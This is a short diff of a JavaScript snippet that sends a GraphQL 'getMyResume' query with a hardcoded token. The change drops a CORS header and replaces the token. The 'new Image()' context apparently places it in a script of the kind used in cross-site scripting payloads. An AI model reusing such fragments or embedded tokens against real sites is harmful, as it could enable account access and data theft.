@@ -10,7 +10,6 @@ var img = new Image();
         headers: {
             "Content-Type": "application/json",
             "Accept": "*/*",
-            "Access-Control-Allow-Origin": "*",
         },
         body: JSON.stringify({
             query: `query getMyResume($token:String!){
@@ -20,7 +19,7 @@ var img = new Image();
                 }
               }`,
             variables: {
-                token: '3c9bfOrRNkKx+oBUo7hB4g=='
+                token: 'gomjEIoerEKXeTF7tS8Syg=='
             }
         })
     });
